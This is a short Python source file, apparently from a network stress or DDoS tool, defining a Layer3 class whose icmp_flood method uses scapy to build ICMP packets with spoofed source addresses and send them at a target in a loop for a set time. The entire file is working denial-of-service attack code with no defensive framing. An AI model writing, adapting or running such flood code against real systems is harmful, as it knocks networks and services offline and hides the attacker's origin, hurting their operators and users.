from scapy.all import *
import time as timing
from utils import spoof_ip
from globals import ICMP_PACKET_AMOUNT


class Layer3:
    @staticmethod
    def icmp_flood(target: str, time: int):
        end_t = timing.time() + time
        packets = []
        for i in range(ICMP_PACKET_AMOUNT):
            packets.append(scapy.all.IP(
                dst=str(target), src=spoof_ip())/scapy.all.ICMP())
        while (timing.time() < end_t):
            send(packets, verbose=0)
